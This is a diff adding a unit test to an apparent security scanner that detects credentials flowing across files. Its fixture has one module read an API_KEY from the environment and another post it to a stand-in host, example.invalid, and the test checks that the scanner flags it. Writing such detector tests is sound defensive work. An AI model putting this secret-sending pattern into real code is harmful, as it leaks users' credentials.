@@ -150,3 +150,12 @@ class RepositoryCoverageTests(unittest.TestCase):
                 if expected:
                     self.assertTrue(signals[0]['source_file'].endswith('/pkg/config.py'))
                     self.assertTrue(signals[0]['file'].endswith('/pkg/app.py'))
+
+    def test_repository_immediate_variable_flow_shows_assignment_evidence(self):
+        source='import os\ndef secret():\n return os.getenv("API_KEY")\n'
+        caller='import requests\nfrom .config import secret\nvalue=secret()\nrequests.post("https://example.invalid",json={"value":value})\n'
+        result=self.repository({'pkg/config.py':source,'pkg/app.py':caller})
+        signal=next(f for f in result['flags'] if f.get('pattern')=='cross_file_credential_payload')
+        self.assertEqual(signal['line'],4)
+        self.assertIn('/pkg/app.py:3',signal['explanation'])
+        self.assertIn('/pkg/app.py:4',signal['explanation'])
